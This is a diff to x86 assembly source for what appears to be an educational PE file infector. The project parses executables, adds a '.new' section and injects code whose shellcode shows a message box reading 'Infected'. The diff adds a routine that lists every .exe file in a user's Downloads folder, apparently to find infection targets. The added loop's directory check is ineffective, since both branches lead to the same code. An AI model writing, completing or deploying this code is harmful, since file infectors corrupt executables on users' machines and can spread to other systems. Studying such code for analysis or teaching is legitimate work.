@@ -68,6 +68,21 @@ endif
 include pe_parser.inc
 include Strings.mac
 
+_ffd struct
+    dwFileAttributes dd ?
+    ftCreationTime FILETIME <>
+    ftLastAccessTime FILETIME <>
+    ftLastWriteTime FILETIME <>
+    nFilcsizeHigh dd ?
+    nFilcsizeLow dd ?
+    dwReserved0 dd ?
+    dwReserved1 dd ?
+    cFileName db MAX_PATH dup(?)
+    cAlternateFileName db 14 dup(?)
+    dwFileType dd ?
+    dwCreatorType dd ?
+    wFinderFlags dw ?
+_ffd ends
 
 Stdcall0 typedef proto CurrentStdcallNotation
 Stdcall1 typedef proto CurrentStdcallNotation :cword
@@ -135,6 +150,9 @@ AlignToBottom proto CurrentStdcallNotation :cword, :cword
 AddSection proto CurrentStdcallNotation :ptr PeHeaders, :cword, : cword, : cword
 LoadPeFile proto CurrentStdcallNotation :cword, :cword, :cword
 ParsePeFileHeader proto CurrentStdcallNotation :cword, :cword
+printFileName proto CurrentStdcallNotation szFileName:ptr dword
+SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, func:ptr FileFunc
+
 
 DefineStdcallProto CreateFileA, 7
 DefineStdcallProto GetFileSize, 2
@@ -155,6 +173,8 @@ DefineStdcallProto memset, 3
 
 DefineCProto strlen
 DefineCProto printf
+DefineCProto sprintf
+DefineCProto strcat
 DefineCProto memcpy
 DefineCProto strcpy
 DefineCProto memset
@@ -185,6 +205,8 @@ local   pe:PeHeaders
 local 	i:cword
 local 	memory:cword
 local 	pe_:cword
+    local szDir[260]:byte
+	local szExt[10]:byte
 
 
 	and csp, -16
@@ -224,6 +246,22 @@ local 	pe_:cword
 	pop cbx
     invoke FindProcArray, addr [cbx + procNames - start], addr [cbx + procPointers - start], procNamesCount
     ; FindProcArray (procNames, procPointers, procNamesCount)
+	
+	invoke sc_memset, addr szDir, 0, 260
+	invoke sc_memset, addr szExt, 0, 10
+	
+	 ; Copy the directory path to szDir
+    invoke sc_strcpy, addr szDir, addr [cbx + dirPath - start]
+    
+     ; Copy the directory path to szDir
+    invoke sc_strcpy, addr szExt, addr [cbx + exeExt - start]
+
+
+	; Get addres of function
+	lea cdi, printFileName
+
+	; Call SearchForFiles
+    invoke SearchForFiles, addr szDir, addr szExt, cdi
 	
 	;;-------------------  
 	lea ccx, [cbx + str_Hello - start]
@@ -270,6 +308,53 @@ local 	pe_:cword
     
 main endp
 
+printFileName proc CurrentStdcallNotation szFileName:ptr dword
+    invoke sc_printf, addr [cbx + outputFormat - start], szFileName
+    ret
+printFileName endp
+
+SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword, fileExtension:ptr dword, func:ptr FileFunc
+	local szExt[10]:byte
+	local hFind:cword
+	local ffd:_ffd
+	
+	invoke sc_memset, addr szExt, 0, 10
+
+	; Initialize szExt
+    invoke sc_sprintf, addr szExt, fileExtension
+    
+    ; Append szExt to szDir
+    invoke sc_strcat, szDir, addr szExt
+    
+    ; Call FindFirstFile
+    invoke FindFirstFileA, szDir, addr ffd
+    mov hFind, cax
+
+    ; Loop through the files
+    cmp hFind, INVALID_HANDLE_VALUE
+    je out_end
+
+    do_loop:
+		;movzx ccx, ffd
+        test ffd._ffd.dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
+        jz not_dir
+
+    not_dir:
+		;; func(ffd.cFileName);
+		mov cdi, func ; Load the function pointer into cdi
+		lea csi, ffd._ffd.cFileName
+		push csi ; Push the argument and call the function
+		call cdi ; Call func
+		add csp, 4 ; Restore the stack
+		
+        invoke sc_FindNextFileA, hFind, addr ffd
+        cmp cax, 0
+        jne do_loop
+
+    out_end:
+        invoke sc_FindClose, hFind
+        ret
+SearchForFiles endp
 
 InjectedCode proc CurrentStdcallNotation uses cdi csi cbx
 	call M
@@ -908,6 +993,9 @@ str_Msvcrt db "msvcrt.dll", 0
 str_Kernel32 db "kernel32.dll", 0
 str_Hello db "hello.exe", 0
 new_sec db ".new", 0
+outputFormat db "%s", 13, 10, 0
+dirPath db 'C:\Users\Labour\Downloads', 0
+exeExt db '\*.exe', 0
 
 strCucdir:
 db ".", 0, 0, 0, 0, 0, 0, 0
@@ -931,7 +1019,7 @@ glShellCode15 db "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x4d\x65\x73"
 glShellCode16 db "\x73\x61\x67\x65\x42\x6f\x78\x41\x00\x4c\x6f\x61\x64\x4c\x69"
 glShellCode17 db "\x62\x72\x61\x72\x79\x41\x00\x49\x6e\x66\x65\x63\x74\x65\x64\x00", 0
 
-DefineFuncNamesAndPointers memset, printf, strlen, UnmapViewOfFile, CloseHandle, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, GetFileSize, CreateFileMappingA, MapViewOfFile, memcpy, strcpy, CreateFileA
+DefineFuncNamesAndPointers memset, printf, sprintf, strcat, strlen, UnmapViewOfFile, CloseHandle, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, GetFileSize, CreateFileMappingA, MapViewOfFile, memcpy, strcpy, CreateFileA
 
 
 
